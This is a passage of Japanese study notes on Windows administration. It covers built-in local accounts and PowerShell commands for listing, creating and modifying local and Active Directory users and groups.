<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">このアカウントは、ローカル ホストで管理タスクを実行するために使用されます。</font></font></td>
</tr>
<tr>
<td><code>Default Account</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">デフォルト アカウントは、Xbox ユーティリティなどのマルチユーザー認証アプリを実行するためにシステムによって使用されます。</font></font></td>
</tr>
<tr>
<td><code>Guest Account</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">このアカウントは、通常のユーザー アカウントを持たないユーザーがホストにアクセスできるようにする、権限が制限されたアカウントです。デフォルトでは無効になっており、そのままにしておく必要があります。</font></font></td>
</tr>
<tr>
<td><code>WDAGUtility Account</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">このアカウントは、アプリケーション セッションをサンドボックス化できる Defender Application Guard 用に配置されています。</font></font></td>
</tr>
</tbody>
</table>

### ③ PowerShellによるユーザとグループの管理
#### ■ ローカルのユーザ、グループの管理
##### ◇ ローカルグループの一覧を取得  
```
get-localgroup
```

##### ◇ ローカルユーザの一覧を取得  
```
get-localuser
```
　  
##### ◇ 新しいローカルユーザの作成  
```
New-LocalUser -Name $user -Password $Password -Description $description
```
　  
##### ◇ ローカルユーザの変更  
```
Set-LocalUser -Name $user -Password $Password -Description $description
```

##### ◇ ローカルグループへのメンバーの追加
```
Add-LocalGroupMember -Group "$group" -Member "$user"
Get-LocalGroupMember -Name "$group"   ### 追加できたか確認
```

#### ■ ドメインユーザーとグループの管理
##### ◇ AD管理用モジュール(RSATに含まれる)のインストール
```
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online  ### RSATのインストール
Get-Module -Name ActiveDirectory -ListAvailable   ### ADモジュールの確認
```

##### ◇ ドメインユーザの一覧を取得
```
Get-ADUser -Filter *
```

##### ◇ ドメインユーザの識別名による検索
```
Get-ADUser -Identity $str
```

##### ◇ ドメインユーザの属性による検索(例：メールアドレスより検索)
```
Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}
```

##### ◇ 新しいドメインユーザの作成
```
New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
Get-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail  #### ADUserの追加の確認
```

###### 説明が必要な要素の説明
○ ユーザ作成の場所  
`-Surname "Tanaka" -GivenName "Mori"` : この部分はユーザーのLastnameとFirstnameを設定します。  
　  
`-Accountpassword (Read-Host -AsSecureString "AccountPassword")` : この部分では、シェルに新しいパスワードの入力を求めるプロンプトを表示してユーザーのパスワードを設定します。  
　  
`-Enabled $true` : アカウントの使用を有効にしている。これが$Falseに設定されている場合、ユーザーはログインできない。  
　  
○ 確認のところ  
`Get-ADUser -Identity MTanaka -Properties *` : ここでは、MTanakaユーザーのプロパティを検索しています。  
　  
`Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail` : ここでは、PowerShellの実行結果を表出力にし、既定のプロパティと拡張プロパティが含まれるように指示します。

##### ◇ ドメインユーザの属性の変更
```
Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"
Get-ADUser -Identity MTanaka -Property Description  ### 確認
```

